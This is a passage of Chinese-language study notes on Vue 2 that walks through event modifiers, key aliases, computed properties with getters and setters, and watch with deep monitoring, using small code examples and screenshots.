<p>KeyboardEvent.keyCode标准已经从Web标准移除，未来浏览器也许会停止支持，所以尽量不要使用该特性。（因为不同键盘编码可能不统一）</p>
<h4 id="定制按键别名"><a href="#定制按键别名" class="headerlink" title="定制按键别名"></a>定制按键别名</h4><p>Vue.config.keyCodes.自定义键名 = 键码 ，可以去定制按键别名。</p>
<p>例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vue">Vue.config.keyCodes.ter &#x3D; 13 &#x2F;&#x2F;定义了一个别名按键<br></code></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;按下回车提示输入&quot; @keyup.ter&#x3D;&quot;showInfo&quot;&gt; &#x2F;&#x2F;EEnter&#x2F;abcDe不行<br></code></pre></td></tr></table></figure>

<p>注意：别名不能带大写字母！！！</p>
<h3 id="1-14-事件总结"><a href="#1-14-事件总结" class="headerlink" title="1.14 事件总结"></a>1.14 事件总结</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;div id&#x3D;&quot;demo1&quot; @click&#x3D;&quot;showInfo&quot;&gt;<br>      &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;miketaylorjuly123.cn&quot; @click.stop&#x3D;&quot;showInfo&quot;&gt;点我跳转&lt;&#x2F;a&gt;<br>    &lt;&#x2F;div&gt;<br></code></pre></td></tr></table></figure>

<p>要求：既需要阻止冒泡，又需要阻止跳转。</p>
<p>方法一：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;div id&#x3D;&quot;demo1&quot; @click&#x3D;&quot;showInfo&quot;&gt;<br>      &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;miketaylorjuly123.cn&quot; @click.stop.prevent&#x3D;&quot;showInfo&quot;&gt;点我跳转&lt;&#x2F;a&gt;<br>    &lt;&#x2F;div&gt;<br></code></pre></td></tr></table></figure>

<p>方法二：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;div id&#x3D;&quot;demo1&quot; @click&#x3D;&quot;showInfo&quot;&gt;<br>      &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;miketaylorjuly123.cn&quot; @click.prevent.stop&#x3D;&quot;showInfo&quot;&gt;点我跳转&lt;&#x2F;a&gt;<br>    &lt;&#x2F;div&gt;<br></code></pre></td></tr></table></figure>

<p>修饰符可以连续书写</p>
<p>案例：按下Ctrl + Y的时候控制台输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;按下回车提示输入&quot; @keydown.ctrl.y&#x3D;&quot;showInfo&quot;&gt;<br></code></pre></td></tr></table></figure>

<h3 id="1-15-计算属性-computed"><a href="#1-15-计算属性-computed" class="headerlink" title="1.15 计算属性 computed"></a>1.15 计算属性 computed</h3><h4 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h4><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/16.gif" srcset="/img/loading.gif" lazyload alt="16" style="zoom:50%;" />

<h4 id="使用插值语法实现"><a href="#使用插值语法实现" class="headerlink" title="使用插值语法实现"></a>使用插值语法实现</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>  &lt;!--准备一个容器--&gt;<br>  &lt;div id&#x3D;&quot;root&quot;&gt;<br>    姓: &lt;input type&#x3D;&quot;text&quot; v-model&#x3D;&quot;firstName&quot;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;<br>    &lt;!--注意：页面上的输入要影响数据本身的变化，应该使用v-model--&gt;<br>    名: &lt;input type&#x3D;&quot;text&quot; v-model&#x3D;&quot;lastName&quot;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;<br>    姓名: &lt;span&gt;&#123;&#123;firstName&#125;&#125;-&#123;&#123;lastName&#125;&#125;&lt;&#x2F;span&gt;<br>  &lt;&#x2F;div&gt;<br><br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>  Vue.config.productionTip &#x3D; false ;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br><br>  const vm &#x3D; new Vue(&#123;<br>    el: &#39;#root&#39;,<br>    data:&#123;<br>      firstName: &#39;张&#39;,<br>      lastName: &#39;三&#39;<br>    &#125;,<br>  &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<p>实现截取部分输入，丢弃过长输入。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vue">姓名: &lt;span&gt;&#123;&#123;firstName.slice(0,3)&#125;&#125;-&#123;&#123;lastName&#125;&#125;&lt;&#x2F;span&gt;<br>&lt;!--截取前三位--&gt;<br></code></pre></td></tr></table></figure>

<h5 id="风格指南"><a href="#风格指南" class="headerlink" title="风格指南"></a>风格指南</h5><p>随着要求越多，<code>&#123;&#123;&#125;&#125;`中的代码会越来越长，虽然不报错，但是这样违背了VUE的风格指南。

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210831210812661.png" srcset="/img/loading.gif" lazyload alt="image-20210831210812661" style="zoom: 67%;" />

#### 使用methods语法实现

##### 易错易混点

methods

注意：fullName中的this是当前vue的实例对象

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">methods:&#123;<br>        <span class="hljs-function"><span class="hljs-title">fullName</span>(<span class="hljs-params"></span>)</span>&#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.firstName + <span class="hljs-string">&#x27;-&#x27;</span> + <span class="hljs-built_in">this</span>.lastName;<br>        &#125;<br>      &#125;<br></code></pre></td></tr></table></figure>

html一：

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">姓名: <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&#123;&#123;fullName()&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-comment">&lt;!--将fullName的返回值插入到此处--&gt;</span><br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210831212531002.png" srcset="/img/loading.gif" lazyload alt="image-20210831212531002" style="zoom:50%;" />

html二：

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">姓名: <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&#123;&#123;fullName&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210831212546602.png" srcset="/img/loading.gif" lazyload alt="image-20210831212546602" style="zoom:50%;" />

**注意**：括号可加可不加的是在绑定事件的时候。

细节问题：**data中任何一个数据发生变化时，vue的模板都会重新解析一遍，以便知道模板中用到该数据的具体位置，然后更新数据**。但是如果模板中没有用到该变化数据，vue模板就不会重新读取该数据；如果用到，就需要重新读取。模板中如果调用方法，此处使用插值语法调用方法，方法会重新调用一次。（因为无法确定返回值与之前是否相同，所以就再调用一次，**重新解析模板时只要遇到插值语法中写方法，这个方法一定重新调用**）

演示解析：

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">fullName</span>(<span class="hljs-params"></span>)</span>&#123;<br>          <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;@@@&#x27;</span>);<br>          <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.firstName + <span class="hljs-string">&#x27;-&#x27;</span> + <span class="hljs-built_in">this</span>.lastName;<br>        &#125;<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/17.gif" srcset="/img/loading.gif" lazyload alt="17" style="zoom:50%;" />

一进入页面就会自动调用fullName，而且每次更改firstName和lastName都会引起fullName的调用。

#### 使用计算属性实现

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210901102718477.png" srcset="/img/loading.gif" lazyload alt="image-20210901102718477" style="zoom:80%;" />

vue认为data中都是属性。

计算属性：使用data中的已有属性（不能是随便的一个变量，必须是由vue管理），加工计算后，得到的一个全新的属性（firstName+lastName==>fullName）,而且要求把计算的整个过程配置成对象，对象中需要写get。

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vue">fullName:&#123;<br>        get()&#123;<br>          console.log(&#39;get被调用！&#39;);<br>          return this.firstName + &#39;-&#39; + this.lastName;<br>        &#125;<br>      &#125;<br></code></pre></td></tr></table></figure>

查看vm实例：

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210901104348928.png" srcset="/img/loading.gif" lazyload alt="image-20210901104348928" style="zoom:80%;" />

注意：_data身上没有fullName属性，fullName是vue利用\_data上的firstName和lastName计算得到fullName后，直接放到vm实例上的。

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210901104502830.png" srcset="/img/loading.gif" lazyload alt="image-20210901104502830" style="zoom:80%;" />

读取计算属性：插值语法。

由于firstName和lastName配置在computed的fullName中的get下，所以不能直接访问，此处get中的this是vm实例。

##### get

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">姓名: <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>姓名: <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>姓名: <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>姓名: <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br></code></pre></td></tr></table></figure>

* 问题：使用计算属性，此处get被调用几次？
  * 1次。vue缓存机制。（computed调用一次，methods调用多次）
* get调用时机：
  * 初次读取计算属性值时
  * 所依赖的数据发生变化时
    * fullName依赖firstName和lastName，firstName或lastName发生变化，调用get
* get有什么作用？
  * 当有人读取fullName时，get就会被调用，且返回值作为fullName的值
  * 底层实现使用的就是defineProperty

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/18.gif" srcset="/img/loading.gif" lazyload alt="18" style="zoom:50%;" />

* 相比于methods的优势：
  * 内部使用缓存机制，不需要反复读取数据，效率更高，调试方便。

##### set

当计算属性会被直接更改时，需要使用set。

* set调用时机：
  * 当计算属性被修改时

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-title">set</span>(<span class="hljs-params">value</span>)</span>&#123;<br>          <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;set被调用了&#x27;</span>,value);<br>        &#125;<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210901111158283.png" srcset="/img/loading.gif" lazyload alt="image-20210901111158283" style="zoom:80%;" />

set的使用效果：

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210901112120758.png" srcset="/img/loading.gif" lazyload alt="image-20210901112120758" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/19.gif" srcset="/img/loading.gif" lazyload alt="19" style="zoom:80%;" />

连锁反应：

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210901112403623.png" srcset="/img/loading.gif" lazyload alt="image-20210901112403623" style="zoom:67%;" />

* 注意：
  * get和set不能写成箭头函数
  * 计算属性最终会出现在vm上，直接读取使用即可
  * 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据的变化

##### 计算属性简写

简写前：

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210901113528485.png" srcset="/img/loading.gif" lazyload alt="image-20210901113528485" style="zoom: 67%;" />

简写要求：只有考虑读取get，不考虑修改set的时候才能使用简写。

简写后：

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vue">computed: &#123;<br>  &#x2F;&#x2F; fullName:function()&#123;<br>  fullName()&#123;<br>      console.log(&#39;get被调用！&#39;);<br>      return this.firstName + &#39;-&#39; + this.lastName;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure>

注意：简写后，千万不要把fullName当做函数，读取时使用`fullName()`读取

### 1.16 监视属性watch

效果图：

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/20.gif" srcset="/img/loading.gif" lazyload alt="20" style="zoom:80%;" />

#### 计算属性实现

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>  &lt;!--准备一个容器--&gt;<br>  &lt;div id&#x3D;&quot;root&quot;&gt;<br>    &lt;h2&gt;今天天气很&#123;&#123;info&#125;&#125;&lt;&#x2F;h2&gt;<br>    &lt;button @click&#x3D;&quot;changeWeather&quot;&gt;切换天气&lt;&#x2F;button&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>  Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>  new Vue(&#123;<br>    el: &#39;#root&#39;,<br>    data: &#123;<br>      isHot: true<br>    &#125;,<br>    computed:&#123;<br>      info()&#123;<br>        return this.isHot ? &#39;炎热&#39; : &#39;凉爽&#39;<br>      &#125;<br>    &#125;,<br>    methods:&#123;<br>      changeWeather()&#123;<br>        this.isHot &#x3D; !this.isHot;<br>      &#125;<br>    &#125;<br>  &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

Vue devTools的BUG：

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>今天天气很一般<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;changeWeather&quot;</span>&gt;</span>切换天气<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure>

页面中没有使用到data和computed中的数据，开发者工具监测不到数据的变化，需要手动刷新开发者工具才行。

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/21.gif" srcset="/img/loading.gif" lazyload alt="21" style="zoom:80%;" />

简写：

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>今天天气很&#123;&#123;info&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;isHot = !isHot&quot;</span>&gt;</span>切换天气<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure>

注：绑定事件的时候：@xxx = 'yyyyyy'，yyyyyy可以写一些简单的语句

错误的简写：

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--点击后弹窗--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>切换天气<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></td></tr></table></figure>

改进：

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;window.alert(1)&quot;</span>&gt;</span>切换天气<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vue">data: &#123;<br>      isHot: true,<br>      window &#x2F;&#x2F;window:window<br>    &#125;<br></code></pre></td></tr></table></figure>

#### 监视属性实现

##### 监视方法一

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vue">watch:&#123;<br>  isHot:&#123;<br>    immediate:true, &#x2F;&#x2F;作用：初始化时让handler调用一下。<br>    handler(newValue,oldValue)&#123;<br>      console.log(&#39;isHot改变了&#39;,newValue,oldValue);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

* handler什么时候调用？
  * 当属性发生变化时。

* watch监视属性，既可以监视属性，也可以监视计算属性

##### 监视方法二

<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haxe">vm.$watch(<span class="hljs-string">&#x27;isHot&#x27;</span>,&#123;<br>	immediate:<span class="hljs-type">true</span>, <span class="hljs-comment">//作用：初始化时让handler调用一下。</span><br>    handler(<span class="hljs-keyword">new</span><span class="hljs-type">Value</span>,oldValue)&#123;<br>    console.log(<span class="hljs-string">&#x27;isHot改变了&#x27;</span>,<span class="hljs-keyword">new</span><span class="hljs-type">Value</span>,oldValue);<br>&#125;)<br></code></pre></td></tr></table></figure>

* 注意：这里的属性名要加`''`，因为原来的写法就是要`''`只是在vue中省略了`''`

##### 总结

* 当被监视的属性发生变化的时候，回调函数自动调用，进行相关操作

* 监视属性必须存在，才能进行监视。(但是属性或计算属性不存在也不会报错)

  * <img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210901150356295.png" srcset="/img/loading.gif" lazyload alt="image-20210901150356295" style="zoom:67%;" />

    ![image-20210901150332224](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210901150332224.png)

* 监视的两种写法：
  * `new Vue`时传入`watch`配置
  * 通过`vm.$watch`监视

#### 深度监视

##### 监视多级结构中某个属性的变化

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/22.gif" srcset="/img/loading.gif" lazyload alt="22" style="zoom:80%;" />

代码：

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>    &lt;h3&gt;a的值是：&#123;&#123;numbers.a&#125;&#125;&lt;&#x2F;h3&gt;<br>    &lt;button @click&#x3D;&quot;numbers.a++&quot;&gt;点我让a++&lt;&#x2F;button&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>  Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>  new Vue(&#123;<br>    el: &#39;#root&#39;,<br>    data: &#123;<br>      numbers:&#123;<br>        a:1,<br>        b:1<br>      &#125;<br>    &#125;,<br>    watch:&#123;<br>      &#39;numbers.a&#39;:&#123;<br>        handler(newValue,oldValue)&#123;<br>          console.log(&#39;a改变了&#39;,newValue,oldValue);<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

注意：监视多级结构中某个属性值的变化一定要加`''`

##### 监视多级结构中所有属性的变化

###### 易错易混

要求：监视整个numbers，当numbers内部任意一个数据发生改变时，都能感知到变化。

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vue">watch:&#123;<br>      numbers:&#123;<br>        handler(newValue,oldValue)&#123;<br>          console.log(&#39;number改变了&#39;,newValue,oldValue);<br>        &#125;<br>     &#125;<br> &#125;<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210901152437129.png" srcset="/img/loading.gif" lazyload alt="image-20210901152437129" style="zoom:80%;" />

###### 正确方法

<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs haxe">watch:<span class="hljs-type"></span>&#123;<br>      numbers:<span class="hljs-type"></span>&#123;<br>      	deep: <span class="hljs-type">true</span>,<span class="hljs-comment">//开启深度监视</span><br>        handler(<span class="hljs-keyword">new</span><span class="hljs-type">Value</span>,oldValue)&#123;<br>          console.log(<span class="hljs-string">&#x27;number改变了&#x27;</span>,<span class="hljs-keyword">new</span><span class="hljs-type">Value</span>,oldValue);<br>        &#125;<br>     &#125;<br> &#125;<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/23.gif" srcset="/img/loading.gif" lazyload alt="23" style="zoom:80%;" />

##### Vue监测数据变化

vue默认是可以监测到data中多级数据的变化的！！！

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vm.numbers.b = 999<br></code></pre></td></tr></table></figure>

证据：上述语句中，b的变化可以展示到页面上。

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/24.gif" srcset="/img/loading.gif" lazyload alt="24" style="zoom:80%;" />

但是vue为程序员提供的监视属性watch，默认是不能监测到data中多级数据的变化的

##### 总结

* Vue中的watch默认不检测对象内部值的改变（一层）（默认不支持是因为效率问题）
  * 配置`deep:true`可以监测对象内部值改变（多层）
* Vue自身可以监测对象内部值得改变，但Vue提供的watch默认不可以！！！
  * 使用watch时根据数据的具体结构，决定是否采用深度监视

#### watch简写

简写要求：当配置项中只有handler，没有immediate、deep等配置项时。

未简写

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vue">watch:&#123;<br>     isHot:&#123;<br>       &#x2F;&#x2F; immediate:true, <br>       handler(newValue,oldValue)&#123;<br>         console.log(&#39;isHot改变了&#39;,newValue,oldValue);<br>       &#125;<br>     &#125;<br>   &#125;<br></code></pre></td></tr></table></figure>

简写一

<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haxe">watch:<span class="hljs-type"></span>&#123;<br>      isHot(<span class="hljs-keyword">new</span><span class="hljs-type">Value</span>,oldValue) &#123;<br>          console.log(<span class="hljs-string">&#x27;isHot改变了&#x27;</span>,<span class="hljs-keyword">new</span><span class="hljs-type">Value</span>,oldValue);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

未简写

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vue">vm.$watch(&#39;isHot&#39;,&#123;<br>    handler(newValue,oldValue)&#123;<br>    console.log(&#39;isHot改变了&#39;,newValue,oldValue);<br>&#125;)<br></code></pre></td></tr></table></figure>

简写二

<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haxe">vm.$watch(<span class="hljs-string">&#x27;isHot&#x27;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span></span>(<span class="hljs-keyword">new</span><span class="hljs-type">Value</span>,oldValue)&#123;<br>    console.log(<span class="hljs-string">&#x27;isHot改变了&#x27;</span>,<span class="hljs-keyword">new</span><span class="hljs-type">Value</span>,oldValue);<br>&#125;)<br></code></pre></td></tr></table></figure>

注：不要使用箭头函数！！！this指向会出问题。

### 1.17 对比watch和computed

#### 姓名案例对比

watch实现姓名案例：

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-comment">&lt;!--准备一个容器--&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span 